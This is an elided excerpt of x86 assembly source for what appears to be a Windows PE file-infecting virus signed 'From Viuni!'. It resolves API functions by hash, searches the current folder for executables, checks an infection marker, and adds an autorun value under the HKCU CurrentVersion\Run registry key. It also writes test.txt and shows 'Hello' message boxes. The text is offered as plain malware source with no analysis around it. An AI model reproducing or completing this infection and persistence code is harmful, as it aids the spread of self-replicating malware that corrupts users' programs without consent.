...
start_index:
    ...
    ;--------------------------------------------------------------
    ;   Get Function Address from Kernell: 
    ;--------------------------------------------------------------
    ...
    ;--------------------------------------------------------------
    ;   Get Function Address from User32.dll: 
    ;--------------------------------------------------------------
    ...
    ; Get First PE File
        ...
        push    eax
        push    256
        call    [ebp + offset _GetCurrentDirectoryA]    
        
        lea     eax, [ebp + offset nameFile]
        push    eax
        lea     eax, [ebp + offset fullName]
        push    eax
        ...
        push    2h  ; CREATE ALWAYS
        push    0   ; NULL
        push    1h  ; FILE_SHARE_READ
        push    40000000h  ; GENERIC_READ | GENERIC_WRITE
        lea     eax, [ebp + offset fullName]
        push    eax 
        call    [ebp + offset _CreateFileA]
        
        mov     [ebp + offset hTxt], eax

        
        push 0
        lea eax, [ebp + offset byte_write]
        push eax
        push 14
        lea eax, [ebp + offset htext]
        push eax 
        push [ebp + offset hTxt]
    ...
    Check_File:
        ...
        lea     eax, [ebp + offset findFileData + 44]   ; cFileName =+ 44
        push    eax
        lea     eax, [ebp + offset path]
        push    eax
        call    [ebp + offset _lstrcatA]
   ...
   ;Check infected: If address of offset kernel32FunctionsHash in last section is 7c0dfcaah then this file is infected.
   ...
   Registry_Write:
        ...
        lea eax, [ebp + offset hKey]
        push eax
        push 00020006h
        push 0
        lea eax, [ebp + offset KeyPath]
        push eax
        push 80000001h
        call [ebp + _RegCreateKey]

        push 6
        lea eax, [ebp + offset KeyValue]
        push eax
        push 1
        push 0
        lea eax, [ebp + offset KeyValue]
        push eax
        push [ebp + offset hKey]
        call [ebp + offset _RegSetValue]
    ...
    ;--------------------------------------------------------------
        ...
        strKernell              db  "kernel32.dll",0
        strContent              db  "Hello",0
        strTitle                db  "Hello",0
        strDone                 db  "From Viuni!",0
        strInMOV                dw  0b890h
        nameFile                db "\test.txt",0
        hModule                 dd      0
        hModule1                dd      0
        hTxt                    dd      ?
        htext                   db "test WrileFile",0
        fullName                db 256 dup(?)
        byte_write              dd      ?
        wtrFail                 db "Write Fail",0
        strMessageBox           db "MessageBox",0
        _MessageBox             dd ?
        hKey                    dd ?
        KeyPath                 db "Software\Microsoft\Windows\CurrentVersion\Run",0
        ValueName               db "Hello",0
        KeyValue                db "Hello",0
  ...
  kernel32FunctionsAddress:
    ...
    kernel32FunctionsHash:
        ...
        hRegCreateKey           dd      0a84aeb81h
        hRegSetValue            dd      2d1c9addh    
        hRegCloseKey            dd      35e273e6h          
